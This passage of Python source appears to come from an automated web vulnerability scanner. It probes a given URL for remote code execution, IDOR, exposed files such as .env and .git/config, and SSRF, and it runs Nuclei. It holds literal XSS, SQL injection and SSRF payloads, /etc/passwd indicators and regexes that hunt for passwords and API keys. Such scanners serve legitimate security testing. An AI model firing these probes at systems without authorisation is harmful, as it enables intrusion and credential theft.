        """Test for Remote Code Execution vulnerabilities"""
        vulnerabilities = []
        
        # Get command-related parameters
        test_params = self._get_relevant_params(['cmd_params'])
        
        for param in test_params[:5]:  # Limit RCE testing to avoid damage
            for payload in self.payloads['rce'][:6]:  # Test top 6 RCE payloads
                try:
                    test_url = f"{target}?{param}={urllib.parse.quote(payload)}"
                    
                    async with self.session.get(test_url) as response:
                        self.scan_stats['requests_made'] += 1
                        self.scan_stats['parameters_tested'] += 1
                        
                        content = await response.text()
                        
                        # Check for RCE indicators
                        if self._is_rce_vulnerable(content):
                            vuln = Vulnerability(
                                id=f"rce_{param}_{int(time.time())}_{random.randint(1000, 9999)}",
                                type="Remote Code Execution (RCE)",
                                severity="Critical",
                                url=test_url,
                                title=f"RCE in parameter '{param}'",
                                description=f"RCE vulnerability allows executing system commands via parameter '{param}'",
                                payload=payload,
                                proof_of_concept=f"Visit: {test_url}",
                                impact="Complete system compromise possible",
                                remediation="Remove command execution functionality or implement strict validation",
                                confidence=0.95,
                                verified=False,
                                timestamp=datetime.now().isoformat(),
                                cvss_score=9.8,
                                references=["https://owasp.org/www-community/attacks/Code_Injection"]
                            )
                            vulnerabilities.append(vuln)
                            logger.info(f"🚨 RCE found: {param} in {target}")
                            break
                    
                    await asyncio.sleep(0.2)  # Longer delay for RCE testing
                except Exception:
                    continue
        
        return vulnerabilities
    
    def _is_rce_vulnerable(self, content: str) -> bool:
        """Check for RCE vulnerability indicators"""
        rce_indicators = [
            'uid=', 'gid=', 'groups=',  # id command output
            'root:x:0:0:', 'daemon:x:1:1:',  # /etc/passwd
            'Microsoft Windows', 'Windows IP Configuration',  # Windows commands
            'total ', 'drwx', '-rw-',  # ls command output
            'Linux version', 'GNU/Linux'  # uname output
        ]
        
        return any(indicator in content for indicator in rce_indicators)
    
    async def _test_idor_vulnerabilities(self, target: str) -> List[Vulnerability]:
        """Test for Insecure Direct Object Reference vulnerabilities"""
        vulnerabilities = []
        
        # Look for URLs with numeric IDs in discovered endpoints
        id_patterns = [r'/(\d+)/?$', r'[?&]id=(\d+)', r'[?&]user=(\d+)', r'[?&]order=(\d+)', r'[?&]account=(\d+)']
        
        for endpoint in list(self.discovered_endpoints)[:10]:  # Test top 10 endpoints
            for pattern in id_patterns:
                match = re.search(pattern, endpoint)
                if match:
                    original_id = match.group(1)
                    
                    # Try different IDs
                    test_ids = [
                        str(int(original_id) + 1),
                        str(int(original_id) - 1),
                        str(int(original_id) + 10),
                        "1", "2", "999", "1000"
                    ]
                    
                    try:
                        # Get original response
                        async with self.session.get(endpoint) as original_response:
                            self.scan_stats['requests_made'] += 1
                            if original_response.status != 200:
                                continue
                            original_content = await original_response.text()
                            original_length = len(original_content)
                        
                        for test_id in test_ids:
                            test_url = re.sub(pattern, lambda m: endpoint[m.start():m.end()].replace(original_id, test_id), endpoint)
                            
                            async with self.session.get(test_url) as response:
                                self.scan_stats['requests_made'] += 1
                                if response.status == 200:
                                    content = await response.text()
                                    
                                    # Check if we got different content (potential IDOR)
                                    if (len(content) > 100 and 
                                        abs(len(content) - original_length) > 50 and
                                        content != original_content):
                                        
                                        vuln = Vulnerability(
                                            id=f"idor_{test_id}_{int(time.time())}_{random.randint(1000, 9999)}",
                                            type="Insecure Direct Object Reference (IDOR)",
                                            severity="Medium",
                                            url=test_url,
                                            title=f"IDOR vulnerability accessing ID {test_id}",
                                            description=f"Possible unauthorized access to object with ID {test_id}",
                                            payload=test_id,
                                            proof_of_concept=f"Compare: {endpoint} vs {test_url}",
                                            impact="Potential unauthorized access to other users' data",
                                            remediation="Implement proper authorization checks",
                                            confidence=0.7,
                                            verified=False,
                                            timestamp=datetime.now().isoformat(),
                                            cvss_score=6.5,
                                            references=["https://owasp.org/www-community/attacks/Insecure_Direct_Object_References"]
                                        )
                                        vulnerabilities.append(vuln)
                                        logger.info(f"🚨 IDOR found: {test_url}")
                                        break
                            
                            await asyncio.sleep(0.1)
                    except Exception:
                        continue
                    
                    break  # Only test first matching pattern per endpoint
        
        return vulnerabilities
    
    async def _test_information_disclosure(self, target: str) -> List[Vulnerability]:
        """Test for information disclosure vulnerabilities"""
        vulnerabilities = []
        
        # Test for sensitive files
        base_url = target.rstrip('/')
        
        for file_path in self.wordlists['sensitive_files']:
            try:
                test_url = f"{base_url}/{file_path}"
                async with self.session.get(test_url) as response:
                    self.scan_stats['requests_made'] += 1
                    if response.status == 200:
                        content = await response.text()
                        
                        # Check for sensitive information patterns
                        if self._has_sensitive_info(content) or len(content) > 100:
                            severity = "High" if self._has_sensitive_info(content) else "Medium"
                            vuln = Vulnerability(
                                id=f"info_disclosure_{file_path.replace('/', '_')}_{int(time.time())}",
                                type="Information Disclosure",
                                severity=severity,
                                url=test_url,
                                title=f"Sensitive File Exposed: {file_path}",
                                description=f"Sensitive file {file_path} is publicly accessible",
                                payload="N/A",
                                proof_of_concept=f"curl {test_url}",
                                impact="Potential exposure of sensitive configuration data or credentials",
                                remediation=f"Restrict access to {file_path}",
                                confidence=0.95,
                                verified=True,
                                timestamp=datetime.now().isoformat(),
                                cvss_score=7.5 if severity == "High" else 5.3,
                                references=["https://owasp.org/www-community/vulnerabilities/Information_exposure_through_directory_listing"]
                            )
                            vulnerabilities.append(vuln)
                            logger.info(f"🚨 Sensitive file found: {file_path}")
                
                await asyncio.sleep(0.1)
            except Exception:
                continue
        
        return vulnerabilities
    
    def _has_sensitive_info(self, content: str) -> bool:
        """Check for sensitive information in content"""
        sensitive_patterns = [
            r'password\s*[:=]\s*["\']?[^"\'\s]+',
            r'api[_-]?key\s*[:=]\s*["\']?[^"\'\s]+',
            r'secret\s*[:=]\s*["\']?[^"\'\s]+',
            r'token\s*[:=]\s*["\']?[^"\'\s]+',
            r'mysql://[^"\'\s]+',
            r'postgresql://[^"\'\s]+',
            r'mongodb://[^"\'\s]+',
            r'redis://[^"\'\s]+',
        ]
        
        return any(re.search(pattern, content, re.IGNORECASE) for pattern in sensitive_patterns)
    
    async def _test_security_misconfigurations(self, target: str) -> List[Vulnerability]:
        """Test for security misconfigurations"""
        vulnerabilities = []
        
        # Test for common misconfigurations
        misconfig_tests = [
            ('.git/config', 'Git Configuration Exposure'),
            ('.env', 'Environment File Exposure'),
            ('phpinfo.php', 'PHP Info Disclosure'),
            ('server-status', 'Apache Server Status'),
            ('server-info', 'Apache Server Info')
        ]
        
        base_url = target.rstrip('/')
        
        for path, title in misconfig_tests:
            try:
                test_url = f"{base_url}/{path}"
                async with self.session.get(test_url) as response:
                    self.scan_stats['requests_made'] += 1
                    if response.status == 200:
                        content = await response.text()
                        
                        if len(content) > 50:  # Has meaningful content
                            vuln = Vulnerability(
                                id=f"misconfig_{path.replace('/', '_')}_{int(time.time())}",
                                type="Security Misconfiguration",
                                severity="Medium",
                                url=test_url,
                                title=title,
                                description=f"Security misconfiguration: {title}",
                                payload="N/A",
                                proof_of_concept=f"curl {test_url}",
                                impact="Information disclosure and potential security risks",
                                remediation=f"Restrict access to {path}",
                                confidence=0.9,
                                verified=True,
                                timestamp=datetime.now().isoformat(),
                                cvss_score=5.3,
                                references=["https://owasp.org/www-community/vulnerabilities/Configuration"]
                            )
                            vulnerabilities.append(vuln)
                            logger.info(f"🚨 Misconfiguration found: {title}")
                
                await asyncio.sleep(0.1)
            except Exception:
                continue
        
        return vulnerabilities
    
    def _get_relevant_params(self, categories: List[str]) -> List[str]:
        """Get relevant parameters for testing"""
        relevant_params = []
        
        for category in categories:
            if category in self.param_categories:
                # Add discovered parameters that match the category
                for param in self.discovered_parameters:
                    if any(keyword in param.lower() for keyword in self.param_categories[category]):
                        relevant_params.append(param)
                
                # Add common parameters from the category
                relevant_params.extend(self.param_categories[category])
        
        # Remove duplicates and return
        return list(set(relevant_params))
    
    async def _run_nuclei_scan(self, target: str) -> List[Vulnerability]:
        """Run Nuclei template scanning"""
        vulnerabilities = []
        
        try:
            # Check if Nuclei is available
            result = subprocess.run(['nuclei', '-version'], capture_output=True, text=True, timeout=5)
            if result.returncode != 0:
                logger.warning("⚠️ Nuclei not available, skipping template scan")
                return []
            
            # Run focused Nuclei scan
            cmd = [
                'nuclei',
                '-u', target,
                '-t', 'cves/',
                '-t', 'vulnerabilities/',
                '-t', 'exposures/',
                '-json',
                '-silent',
                '-rate-limit', '10',
                '-timeout', '10',
                '-retries', '2'
            ]
            
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            try:
                stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=60)
                
                if process.returncode == 0:
                    for line in stdout.decode().strip().split('\n'):
                        if line.strip():
                            try:
                                nuclei_data = json.loads(line)
                                vuln = self._parse_nuclei_result(nuclei_data)
                                vulnerabilities.append(vuln)
                            except json.JSONDecodeError:
                                continue
                    
                    logger.info(f"🚀 Nuclei found {len(vulnerabilities)} vulnerabilities")
                
            except asyncio.TimeoutError:
                process.kill()
                logger.warning("⚠️ Nuclei scan timed out")
                
        except Exception as e:
            logger.error(f"❌ Nuclei scan failed: {str(e)}")
        
        return vulnerabilities
    
    def _parse_nuclei_result(self, nuclei_data: Dict[str, Any]) -> Vulnerability:
        """Parse Nuclei result into Vulnerability object"""
        info = nuclei_data.get('info', {})
        
        severity_mapping = {
            'info': 'Low',
            'low': 'Low',
            'medium': 'Medium',
            'high': 'High',
            'critical': 'Critical'
        }
        
        severity = severity_mapping.get(info.get('severity', 'low').lower(), 'Low')
        
        # Calculate CVSS score based on severity
        cvss_mapping = {
            'Critical': 9.0,
            'High': 7.5,
            'Medium': 5.0,
            'Low': 2.0
        }
        
        return Vulnerability(
            id=f"nuclei_{nuclei_data.get('template-id', 'unknown')}_{int(time.time())}",
            type=info.get('name', 'Nuclei Detection'),
            severity=severity,
            url=nuclei_data.get('matched-at', ''),
            title=info.get('name', 'Nuclei Detection'),
            description=info.get('description', 'Vulnerability detected by Nuclei'),
            payload=nuclei_data.get('extracted-results', ['N/A'])[0] if nuclei_data.get('extracted-results') else 'N/A',
            proof_of_concept=f"Nuclei template: {nuclei_data.get('template-id', 'unknown')}",
            impact=self._get_impact_from_severity(severity),
            remediation=info.get('remediation', 'Follow security best practices'),
            confidence=0.9,
            verified=True,
            timestamp=nuclei_data.get('timestamp', datetime.now().isoformat()),
            cvss_score=cvss_mapping.get(severity, 2.0),
            references=info.get('reference', []) if isinstance(info.get('reference'), list) else [info.get('reference', '')]
        )
    
    def _get_impact_from_severity(self, severity: str) -> str:
        """Get impact description based on severity"""
        impact_map = {
            'Critical': 'Complete system compromise possible',
            'High': 'Significant security risk with potential for data breach',
            'Medium': 'Moderate security risk requiring attention',
            'Low': 'Minor security issue with limited impact'
        }
        return impact_map.get(severity, 'Security vulnerability detected')
    
    async def _verify_vulnerabilities(self, vulnerabilities: List[Vulnerability]) -> List[Vulnerability]:
        """Verify vulnerabilities to reduce false positives"""
        verified = []
        
        for vuln in vulnerabilities:
            try:
                # Re-test critical and high severity vulnerabilities
                if vuln.severity in ["Critical", "High"]:
                    if await self._reverify_vulnerability(vuln):
                        vuln.verified = True
                        vuln.confidence = min(vuln.confidence + 0.1, 1.0)
                    else:
                        vuln.confidence = max(vuln.confidence - 0.2, 0.1)
                
                verified.append(vuln)
                await asyncio.sleep(0.1)
                
            except Exception:
                # If verification fails, still include with lower confidence
                vuln.confidence = max(vuln.confidence - 0.2, 0.1)
                verified.append(vuln)
        
        return verified
    
    async def _reverify_vulnerability(self, vuln: Vulnerability) -> bool:
        """Re-verify a specific vulnerability"""
        try:
            if vuln.type == "Cross-Site Scripting (XSS)":
                # Try a different XSS payload
                test_payload = '<img src=x onerror=alert(1)>'
                test_url = vuln.url.replace(urllib.parse.quote(vuln.payload), urllib.parse.quote(test_payload))
                
                async with self.session.get(test_url) as response:
                    content = await response.text()
                    return test_payload in content
            
            elif vuln.type == "SQL Injection":
                # Try a different SQLi payload
                test_payload = "' AND '1'='1"
                test_url = vuln.url.replace(urllib.parse.quote(vuln.payload), urllib.parse.quote(test_payload))
                
                async with self.session.get(test_url) as response:
                    content = await response.text()
                    return self._has_sql_errors(content)
            
            elif vuln.type == "Server-Side Request Forgery (SSRF)":
                # Try a different SSRF payload
                test_payload = "http://127.0.0.1:22"
                test_url = vuln.url.replace(urllib.parse.quote(vuln.payload), urllib.parse.quote(test_payload))
                
                async with self.session.get(test_url) as response:
                    content = await response.text()
                    return self._has_ssrf_indicators(content)
            
            return False
            
        except Exception:
            return False
    
    async def _assess_risk(self, vulnerabilities: List[Vulnerability]) -> List[Vulnerability]:
        """Assess and prioritize vulnerabilities by risk"""
        for vuln in vulnerabilities:
            # Adjust CVSS score based on context
            if vuln.verified:
                vuln.cvss_score = min(vuln.cvss_score + 0.5, 10.0)
            
            # Adjust based on confidence
            vuln.cvss_score = vuln.cvss_score * vuln.confidence
            
            # Add context-based risk factors
            if 'admin' in vuln.url.lower():
                vuln.cvss_score = min(vuln.cvss_score + 1.0, 10.0)
            
            if 'api' in vuln.url.lower():
                vuln.cvss_score = min(vuln.cvss_score + 0.5, 10.0)
        
        # Sort by CVSS score (highest first)
        vulnerabilities.sort(key=lambda x: x.cvss_score, reverse=True)
        
        return vulnerabilities
    
    async def generate_comprehensive_report(self, vulnerabilities: List[Vulnerability], target: str) -> str:
        """Generate comprehensive vulnerability report"""
        timestamp = int(time.time())
        report_file = f"output/aegis_x_final_report_{target.replace('://', '_').replace('/', '_')}_{timestamp}.json"
        
        # Calculate comprehensive statistics
        total_vulns = len(vulnerabilities)
        critical_vulns = len([v for v in vulnerabilities if v.severity == "Critical"])
        high_vulns = len([v for v in vulnerabilities if v.severity == "High"])
        medium_vulns = len([v for v in vulnerabilities if v.severity == "Medium"])
        low_vulns = len([v for v in vulnerabilities if v.severity == "Low"])
        verified_vulns = len([v for v in vulnerabilities if v.verified])
        
        # Calculate average CVSS score
        avg_cvss = sum(v.cvss_score for v in vulnerabilities) / total_vulns if total_vulns > 0 else 0
        
        # Group vulnerabilities by type
        vuln_types = {}
        for vuln in vulnerabilities:
            if vuln.type not in vuln_types:
                vuln_types[vuln.type] = 0
            vuln_types[vuln.type] += 1
        
        scan_duration = (self.scan_stats['end_time'] - self.scan_stats['start_time']).total_seconds()
        
        report_data = {
            "scan_info": {
                "target": target,
                "timestamp": datetime.now().isoformat(),
                "scanner": "AEGIS-X Final",
                "version": "1.0",
                "scan_duration_seconds": scan_duration,
                "scan_type": "Comprehensive Vulnerability Assessment"
            },
            "statistics": {
                "total_vulnerabilities": total_vulns,
                "critical": critical_vulns,
                "high": high_vulns,
                "medium": medium_vulns,
                "low": low_vulns,
                "verified": verified_vulns,
                "verification_rate": round(verified_vulns / total_vulns * 100, 2) if total_vulns > 0 else 0,
                "average_cvss_score": round(avg_cvss, 2),
                "vulnerability_types": vuln_types,
                "requests_made": self.scan_stats['requests_made'],
                "endpoints_tested": self.scan_stats['endpoints_tested'],
                "parameters_tested": self.scan_stats['parameters_tested']
            },
            "target_info": self.target_info,
            "discovered_assets": {
                "subdomains": list(self.discovered_subdomains),
                "endpoints": list(self.discovered_endpoints)[:100],  # Limit output
                "parameters": list(self.discovered_parameters)[:100]  # Limit output
            },
            "vulnerabilities": [asdict(vuln) for vuln in vulnerabilities],
            "risk_assessment": {
                "overall_risk": self._calculate_overall_risk(vulnerabilities),
                "top_risks": [asdict(vuln) for vuln in vulnerabilities[:5]],  # Top 5 risks
                "recommendations": self._generate_recommendations(vulnerabilities)
            }
        }
        
        with open(report_file, 'w') as f:
            json.dump(report_data, f, indent=2)
        
        # Print comprehensive summary
        logger.info("=" * 80)
        logger.info("🎯 AEGIS-X FINAL - COMPREHENSIVE SCAN RESULTS")
        logger.info("=" * 80)
        logger.info(f"Target: {target}")
        logger.info(f"Scan Duration: {scan_duration:.2f} seconds")
        logger.info(f"Requests Made: {self.scan_stats['requests_made']}")
        logger.info(f"Endpoints Tested: {self.scan_stats['endpoints_tested']}")
        logger.info(f"Parameters Tested: {self.scan_stats['parameters_tested']}")
        logger.info("-" * 80)
        logger.info(f"Discovered Assets:")
        logger.info(f"  Subdomains: {len(self.discovered_subdomains)}")
        logger.info(f"  Endpoints: {len(self.discovered_endpoints)}")
        logger.info(f"  Parameters: {len(self.discovered_parameters)}")
        logger.info("-" * 80)
        logger.info(f"Vulnerability Summary:")
        logger.info(f"  Total Vulnerabilities: {total_vulns}")
        logger.info(f"  Critical: {critical_vulns}")
        logger.info(f"  High: {high_vulns}")
        logger.info(f"  Medium: {medium_vulns}")
        logger.info(f"  Low: {low_vulns}")
        logger.info(f"  Verified: {verified_vulns} ({round(verified_vulns / total_vulns * 100, 2) if total_vulns > 0 else 0}%)")
        logger.info(f"  Average CVSS Score: {round(avg_cvss, 2)}")
        logger.info("-" * 80)
        logger.info(f"Vulnerability Types:")
        for vuln_type, count in sorted(vuln_types.items(), key=lambda x: x[1], reverse=True):
            logger.info(f"  {vuln_type}: {count}")
        logger.info("-" * 80)
        logger.info(f"Overall Risk Level: {self._calculate_overall_risk(vulnerabilities)}")
        logger.info(f"Report saved: {report_file}")
        logger.info("=" * 80)
        
        return report_file
    
    def _calculate_overall_risk(self, vulnerabilities: List[Vulnerability]) -> str:
        """Calculate overall risk level"""
        if not vulnerabilities:
            return "Low"
        
        critical_count = len([v for v in vulnerabilities if v.severity == "Critical"])
        high_count = len([v for v in vulnerabilities if v.severity == "High"])
        medium_count = len([v for v in vulnerabilities if v.severity == "Medium"])
        
        if critical_count > 0:
            return "Critical"
        elif high_count >= 3:
            return "High"
        elif high_count > 0 or medium_count >= 5:
            return "Medium"
        else:
            return "Low"
    
    def _generate_recommendations(self, vulnerabilities: List[Vulnerability]) -> List[str]:
        """Generate security recommendations"""
        recommendations = []
        
        vuln_types = set(v.type for v in vulnerabilities)
        
        if "Cross-Site Scripting (XSS)" in vuln_types:
            recommendations.append("Implement proper input validation and output encoding to prevent XSS attacks")
        
        if "SQL Injection" in vuln_types:
            recommendations.append("Use parameterized queries and prepared statements to prevent SQL injection")
        
        if "Server-Side Request Forgery (SSRF)" in vuln_types:
            recommendations.append("Implement URL validation and whitelist allowed domains for SSRF prevention")
        
        if "Local File Inclusion (LFI)" in vuln_types:
            recommendations.append("Implement proper file path validation and restrict file access")
        
        if "Remote Code Execution (RCE)" in vuln_types:
            recommendations.append("Remove or secure command execution functionality immediately")
        
        if "Information Disclosure" in vuln_types:
            recommendations.append("Restrict access to sensitive files and implement proper access controls")
        
        if "Security Headers" in vuln_types:
            recommendations.append("Implement comprehensive security headers for defense in depth")
        
        recommendations.append("Conduct regular security assessments and penetration testing")
        recommendations.append("Implement a Web Application Firewall (WAF) for additional protection")
        recommendations.append("Keep all software components updated to the latest versions")
        
        return recommendations
    
    async def close(self):
        """Clean up resources"""
        if self.session:
            await self.session.close()

async def main():
    """Main function"""
    parser = argparse.ArgumentParser(description="AEGIS-X Final - Production-Ready Vulnerability Scanner")
    parser.add_argument("target", help="Target URL to scan")
    parser.add_argument("--timeout", type=int, default=600, help="Scan timeout in seconds")
    parser.add_argument("--output", help="Output file path")
    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose output")
    
    args = parser.parse_args()
    
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    scanner = AegisXFinal()
    
    try:
        await scanner.initialize()
        
        # Run the comprehensive scan
        vulnerabilities = await scanner.scan_target(args.target)
        
        # Generate comprehensive report
        report_file = await scanner.generate_comprehensive_report(vulnerabilities, args.target)
        
        # Success criteria check
        critical_count = len([v for v in vulnerabilities if v.severity == "Critical"])
        high_count = len([v for v in vulnerabilities if v.severity == "High"])
        medium_count = len([v for v in vulnerabilities if v.severity == "Medium"])
        total_count = len(vulnerabilities)
        
        logger.info("🎯 Checking Success Criteria:")
        logger.info(f"✅ Total Vulnerabilities: {total_count}")
        logger.info(f"✅ Critical: {critical_count}")
        logger.info(f"✅ High: {high_count}")
        logger.info(f"✅ Medium: {medium_count}")
        
        if total_count > 0:
            logger.info("🎉 SUCCESS: Vulnerabilities found!")
            if critical_count > 0:
                logger.info("🚨 CRITICAL: Immediate action required!")
            elif high_count > 0:
                logger.info("⚠️ HIGH RISK: Urgent attention needed!")
        else:
            logger.info("⚠️ No vulnerabilities found - target may be well secured")
        
    except KeyboardInterrupt:
        logger.info("🛑 Scan interrupted by user")
    except Exception as e:
        logger.error(f"❌ Scan failed: {str(e)}")
    finally:
        await scanner.close()

if __name__ == "__main__":
    asyncio.run(main())